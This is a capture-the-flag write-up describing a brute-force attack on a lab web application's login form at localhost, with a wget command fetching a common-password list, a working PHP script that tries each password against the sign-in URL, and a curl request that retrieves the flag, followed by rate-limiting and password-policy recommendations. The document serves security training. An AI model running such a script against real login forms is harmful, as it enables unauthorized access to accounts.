## Brute Force Password Attack

### Summary
A brute force vulnerability was discovered in the website's login form. By automating password attempts using a list of common credentials, it was possible to bypass authentication and retrieve a flag.

### Methodology
1. Identified a login form requiring an email and password.
2. Obtained a list of common passwords:
    ```bash
    wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10k-most-common.txt
    ```
3. Developed a PHP script to automate login attempts using the email `webmaster@borntosec.com` and each password from the list:
    ```php
    <?php
    $dict = getcwd() . '/10k-most-common.txt';
    if (!file_exists($dict)) {
        die("Dictionary file not found: $dict\n");
    }
    $lines = file($dict, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        $line = trim($line);
        if ($line === '') continue;
        $url = "http://localhost:8080/?page=signin&username=webmaster%40borntosec.com&password=" . $line . "&Login=Login";
        $response = file_get_contents($url);
        if (strpos($response, 'flag') !== false) {
            echo "Password found: $line\n";
            $flag = preg_match('/flag is : (\S+)/', $response, $matches) ? $matches[1] : 'Flag not found in response';
            echo "Flag: $flag\n";
            exit(0);
        }
    }
    ?>
    ```
4. The password `shadow` was found to be valid.
5. Retrieved the flag using a curl request:
    ```bash
    curl "http://localhost:8080/?page=signin&username=webmaster%40borntosec.com&password=shadow&Login=Login" | grep flag
    ```

### Findings
- The login form does not implement rate limiting or account lockout, making it susceptible to brute force attacks.
- Use of common passwords increases the risk of unauthorized access.

### Recommendation
- Implement rate limiting and account lockout mechanisms.
- Enforce strong password policies and monitor for suspicious login activity.
